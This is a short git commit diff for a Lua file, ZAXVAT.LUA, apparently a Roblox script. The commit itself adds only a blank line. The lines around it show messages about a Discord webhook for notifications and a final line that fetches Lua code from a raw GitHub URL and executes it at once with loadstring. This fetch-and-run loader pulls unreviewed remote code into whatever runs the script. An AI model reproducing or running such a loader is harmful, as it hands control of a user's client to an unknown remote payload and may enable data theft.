bbd21083b5732a612ed771b1dfd1000163d81c68
piskastroi1-ui <piskastroi1@gmail.com>
2025-10-18 10:22:15 +0300

    Update ZAXVAT.LUA

--- ZAXVAT.LUA
+++ ZAXVAT.LUA
@@ -661,4 +661,5 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
